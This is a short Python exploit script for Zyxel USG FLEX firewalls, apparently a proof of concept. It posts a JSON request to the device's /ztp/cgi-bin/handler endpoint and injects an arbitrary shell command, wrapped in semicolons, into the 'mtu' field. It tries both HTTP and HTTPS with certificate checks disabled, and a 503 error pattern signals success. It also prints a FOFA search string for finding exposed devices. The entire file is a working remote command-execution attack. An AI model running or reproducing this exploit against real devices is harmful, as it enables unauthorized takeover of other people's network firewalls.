#!/usr/bin/env python3
# _*_ coding:utf-8 _*_

import argparse
import requests
import urllib3
import time
import json
import sys
import os
import re

from requests.packages.urllib3.exceptions import InsecureRequestWarning


def title():
    print('+          FOFA:title="USG FLEX"')


def run_proto(url, cmd):
    check_url = url + "/ztp/cgi-bin/handler"
    headers = {
        'Content-Type': 'application/json; charset=utf-8'
    }
    bash_exploit = ";{};".format(cmd)
    payload = {
        'command': 'setWanPortSt',
        'proto': 'dhcp',
        'port': '1270',
        'vlan_tagged': '1270',
        'vlanid': '1270',
        'mtu': bash_exploit,
        'data': ''
    }
    try:
        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
        response = requests.get(url=check_url, headers=headers, json=payload, timeout=(6, 6), verify=False)
        reC = re.search('message.*?Internal.*?Server.*?Error.*?code.*?result', response.text, re.I)
        if reC and response.status_code == 503:
            print(response.text)
            print(url + 'sExist \n\n\n\n')
            return True
        else:
            print(url + 'UExist')
            return False
    except Exception as e:
        print(e)
        print(url + 'UExist')
        return False


def run(target, cmd):
    i = 0
    proto = ['http', 'https']
    while i < 2:
        url = '{}://{}'.format(proto[i], target)
        if run_proto(url, cmd):
            return True
        else:
            i = i + 1


if __name__ == '__main__':
    title()
    parse = argparse.ArgumentParser()
    parse.add_argument('-u', '--url')
    parse.add_argument('-c', '--cmd', default='whoami')
    args = parse.parse_args()
    target = args.url
    cmd = args.cmd

    result = run(target, cmd)

    if result:
        print('Exist')
    else:
        print('UnExist')
